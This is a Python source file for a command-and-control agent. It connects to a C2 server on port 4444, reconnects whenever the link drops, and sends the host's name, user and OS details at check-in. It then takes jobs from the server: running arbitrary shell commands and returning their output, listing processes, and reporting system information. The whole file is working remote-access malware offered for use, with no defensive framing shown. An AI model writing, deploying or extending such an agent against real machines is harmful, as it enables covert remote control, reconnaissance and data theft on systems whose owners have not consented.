#!/usr/bin/env python3
import socket
import json
import platform
import getpass
import uuid
import time
import subprocess
import os
import sys

class FastAgent:
    def __init__(self, server_host='127.0.0.1', server_port=4444, agent_id=None):
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or str(uuid.uuid4())
        self.running = True
        
    def get_system_info(self):
        """Collect system information"""
        return {
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'architecture': platform.architecture()[0],
            'os_version': platform.platform(),
            'python_version': platform.python_version(),
            'current_directory': os.getcwd()
        }
    
    def connect(self):
        """Main agent loop with persistent connection"""
        print(f"[🚀] Fast Agent starting... ID: {self.agent_id}")
        print(f"[→] Connecting to {self.server_host}:{self.server_port}")
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30.0)
                sock.connect((self.server_host, self.server_port))
                
                print("[✓] Connected to C2 server")
                
                # Send initial check-in
                checkin_msg = {
                    'type': 'checkin',
                    'agent_id': self.agent_id,
                    'system_info': self.get_system_info()
                }
                sock.send(json.dumps(checkin_msg).encode('utf-8'))
                
                # Main communication loop
                while self.running:
                    try:
                        # Check for incoming jobs
                        data = sock.recv(4096).decode('utf-8')
                        if not data:
                            break
                            
                        message = json.loads(data)
                        if message.get('type') == 'job':
                            self.execute_and_respond(sock, message)
                            
                    except socket.timeout:
                        continue  # No data, keep connection alive
                    except json.JSONDecodeError:
                        continue  # Invalid JSON, keep going
                    except Exception as e:
                        print(f"[-] Communication error: {e}")
                        break
                        
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                print(f"[*] Reconnecting in 5 seconds...")
                time.sleep(5)
    
    def execute_and_respond(self, sock, job_message):
        """Execute job and send response immediately"""
        job_id = job_message['job_id']
        module_name = job_message['module_name']
        arguments = job_message.get('arguments', {})
        
        print(f"[+] Executing: {module_name}")
        
        try:
            if module_name == 'shell':
                result = self.execute_shell_command(arguments)
            elif module_name == 'sysinfo':
                result = self.get_detailed_system_info()
            elif module_name == 'process_list':
                result = self.get_process_list()
            elif module_name == 'upload':
                result = self.handle_upload(arguments)
            elif module_name == 'download':
                result = self.handle_download(arguments)
            else:
                result = f"Unknown module: {module_name}"
            
            # Send response immediately
            response = {
                'type': 'job_result',
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': result,
                'success': True
            }
            
        except Exception as e:
            response = {
                'type': 'job_result', 
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': f"Error: {str(e)}",
                'success': False
            }
        
        sock.send(json.dumps(response).encode('utf-8'))
        print(f"[✓] Response sent for {job_id}")
    
    def execute_shell_command(self, arguments):
        """Execute shell command"""
        command = arguments.get('command', '')
        if not command:
            return "No command provided"
        
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_detailed_system_info(self):
        """Get comprehensive system info"""
        import psutil
        
        info = self.get_system_info()
        info['ram_total_gb'] = round(psutil.virtual_memory().total / (1024**3), 2)
        info['ram_available_gb'] = round(psutil.virtual_memory().available / (1024**3), 2)
        info['cpu_cores'] = psutil.cpu_count()
        info['boot_time'] = psutil.boot_time()
        
        return json.dumps(info, indent=2)
    
    def get_process_list(self):
        """Get running processes"""
        import psutil
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
            try:
                processes.append(proc.info)
            except psutil.NoSuchProcess:
                continue
        
        processes.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
        
        result = "Running Processes (Top 15):\n"
        result += "-" * 60 + "\n"
        result += f"{'PID':<8} {'Name':<20} {'User':<15} {'Memory %':<10}\n"
        result += "-" * 60 + "\n"
        
        for proc in processes[:15]:
            result += f"{proc['pid']:<8} {proc['name'][:19]:<20} {proc['username'][:14]:<15} {proc['memory_percent'] or 0:<10.2f}\n"
        
        return result
    
    def handle_upload(self, arguments):
        return "Upload module - implement me"
    
    def handle_download(self, arguments):
        return "Download module - implement me"

if __name__ == "__main__":
    agent = FastAgent(server_host='127.0.0.1', server_port=4444)
    agent.connect()